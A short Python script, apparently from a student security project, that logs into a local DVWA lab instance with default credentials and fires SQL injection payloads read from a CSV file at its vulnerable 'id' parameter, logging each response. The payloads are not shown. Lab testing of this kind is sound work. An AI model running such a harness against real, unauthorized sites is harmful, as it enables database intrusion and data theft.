import requests
import csv
from urllib.parse import urlencode

# Target URL
base_url = "http://192.168.243.130/DVWA-master/vulnerabilities/sqli/"

# Path to input CSV file
input_csv_path = '/home/haneen/GP/converted_sqli.csv'

# Session to maintain cookies (for authentication purposes if needed)
session = requests.Session()

# Login to DVWA (update credentials if necessary)
login_url = "http://192.168.243.130/DVWA-master/login.php"
login_payload = {
    "username": "admin",  # Update username
    "password": "password",  # Update password
    "Login": "Login"
}

response = session.post(login_url, data=login_payload)

# Check if login was successful
if "Welcome" not in response.text:
    print("Login failed! Check credentials or CSRF token requirements.")
    exit()

print("Login successful. Executing payloads...")

# Function to execute SQLi payload
def execute_payload(payload):
    try:
        # Construct the full URL with the SQLi payload
        query_string = urlencode({"id": payload, "Submit": "Submit"})
        full_url = f"{base_url}?{query_string}"

        # Send the payload
        response = session.get(full_url)

        # Log the execution details
        print(f"Executing payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        print("---")

    except requests.RequestException as e:
        print(f"Error with payload {payload}: {e}")

# Read payloads from CSV and execute them
with open(input_csv_path, 'r', encoding='utf-8') as input_file:
    reader = csv.reader(input_file)
    next(reader)  # Skip header row
    for row in reader:
        payload = row[0].strip()
        if payload:
            execute_payload(payload)

print("Payload execution completed.")
